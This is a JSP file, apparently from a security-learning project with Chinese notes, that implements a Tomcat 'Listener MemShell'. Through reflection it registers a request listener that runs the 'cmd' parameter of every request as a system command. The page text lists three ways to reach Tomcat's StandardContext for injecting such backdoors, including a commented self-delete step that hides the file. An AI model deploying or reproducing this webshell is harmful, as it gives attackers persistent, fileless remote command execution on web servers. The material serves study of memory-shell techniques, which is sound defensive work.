<%--
  Created by IntelliJ IDEA.
  User: madahaRCE
  Date: 2023/6/26
  Time: 16:44
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>>

<%!
    public class Shell_Listener implements ServletRequestListener {

        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            // 此处，仅仅是为了测试jsp页面报错的原因。
            // 通过测试发现未执行jsp的原因，是使用Controller进行jsp返回时 渲染jsp报错 直接抛出异常，jsp内的java代码未能成功执行！！！
            //try {
            //    Runtime.getRuntime().exec("notepad");
            //} catch (Exception e){
            //    e.printStackTrace();
            //}

            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
            String cmd = req.getParameter("cmd");
            if (cmd != null){
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e){
                    e.printStackTrace();
                } catch (NullPointerException n) {
                    n.printStackTrace();
                }
            }
        }

        @Override
        public void requestDestroyed(ServletRequestEvent sre) {
            // ServletRequestListener.super.requestDestroyed(sre);
        }
    }
%>
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();

    // 注意这里！！！
    System.out.println(standardContext.toString());

    // StandardEngine[Tomcat].StandardHost[localhost].TomcatEmbeddedContext[]
    // 天坑啊，我要吐槽吐槽！！！这里试了一天也没有找到JSP调试的办法，只能通过java程序报错，然后看堆栈和参数信息进行分析。
    // 最后用打印的方式，勉强看一下这里获取的standardContext到底是个啥玩意。不过堆栈和参数信息里也有，看到standardContext变量里获取的是TomcatEmbeddedContext类。
    // 最坑的就是TomcatEmbeddedContext是 extends StandardContext类，所以这里就需要获取父类的私有成员属性。
    // 这也是为什么Listener.jsp中获取StandardContext没有报错，而Filter中报错的原因。是因为addApplicationEventListener()方法是public，而filterConfigs属性是private。


    Shell_Listener shell_listener = new Shell_Listener();
    standardContext.addApplicationEventListener(shell_listener);
%>




<html>
<head>
    <title>Listener MemShell</title>
</head>
<body>
    ${data}

    <br>普通jsp直接页面返回！！<br>

    <br>
         注意点：<br>
            （1）JSP内置了request对象。<br>
            （2）使用Controller可以直接访问jsp页面；  如果是使用war形式 + 配置前后缀，也可以直接访问jsp页面！<br>
            （3）giaogiao！！！  我想吐槽的是，如果通过Controller去跳转jsp内存马页面，这种情况下会直接报错并抛出异常，导致jsp页面不能完成渲染执行！！！<br>
    <br>

    <br>
        <h1>
        <h3>在jsp中如何获得StandardContext对象:</h3>

        <h5>方式一：</h5>
            <p>
                Field reqF = request.getClass().getDeclaredField("request");<br>
                reqF.setAccessible(true);<br>
                Request req = (Request) reqF.get(request);<br>
                StandardContext context = (StandardContext) req.getContext();<br>
            </p>

        <h5>方式二：</h5>
            <p>
                WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>
                StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();<br>
            </p>

        <h5>方式三：</h5>
            <p>
                // 通过反射从ApplicationContextFacade中获取到当前的StandardContext<br>
                ServletContext servletContext =  request.getSession().getServletContext();<br>
                Field field = servletContext.getClass().getDeclaredField("context");<br>
                field.setAccessible(true);<br>
                ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);<br>
                field = applicationContext.getClass().getDeclaredField("context");<br>
                field.setAccessible(true);<br>
                StandardContext standardContext = (StandardContext) field.get(applicationContext);<br>
                standardContext.addApplicationEventListener(new BackdoorListener());<br>
                // 自毁    // (new File(application.getRealPath(request.getServletPath()))).delete();<br>
            </p>
    <br>

</body>
</html>



<%--
    注意点：
       （1）使用Controller可以直接访问jsp页面；  如果是使用war形式 + 配置前后缀，也可以直接访问jsp页面！
       （2）giaogiao！！！  我想吐槽的是，如果通过Controller去跳转jsp内存马页面，这种情况下会直接报错并抛出异常，导致jsp页面不能完成渲染执行！！！
--%>